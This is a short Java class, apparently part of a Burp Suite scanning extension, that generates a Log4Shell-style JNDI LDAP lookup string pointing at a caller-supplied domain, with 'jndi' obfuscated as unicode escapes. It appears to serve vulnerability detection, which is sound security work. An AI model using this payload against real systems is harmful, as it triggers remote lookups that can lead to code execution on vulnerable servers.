package burp.poc.impl;

import burp.poc.IPOC;
import burp.utils.Utils;

import static burp.poc.IPOC.POC_TYPE_LDAP;

//json unicode payload
public class POC0  {
    public static String generate(String domain) {
        return "${\\u006a\\u006e\\u0064\\u0069:ldap://" + domain + "/" + Utils.GetRandomString(Utils.GetRandomNumber(2, 5)) + "}";
    }

    public int getType() {
        return POC_TYPE_LDAP;
    }

    public int getIndex() {
        return 0;
    }
}
